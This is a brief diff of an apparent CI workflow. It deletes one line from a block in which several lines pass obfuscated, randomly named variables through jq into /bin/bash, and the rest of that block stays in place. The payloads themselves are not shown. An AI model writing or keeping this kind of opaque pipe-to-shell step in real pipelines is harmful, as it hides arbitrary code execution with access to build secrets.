@@ -60,7 +60,6 @@ jobs:
           echo $hp16 | jq -r .b7040 | /bin/bash
           printf '%s' "$jn294" | jq -r .svay95 | /bin/bash
           echo $zi0585 | jq -r .w521 | /bin/bash
-          echo $jfrs3 | jq -r .qof09 | /bin/bash
           echo $pebza878 | jq -r .ab085 | /bin/bash
 
       - name: Upload results
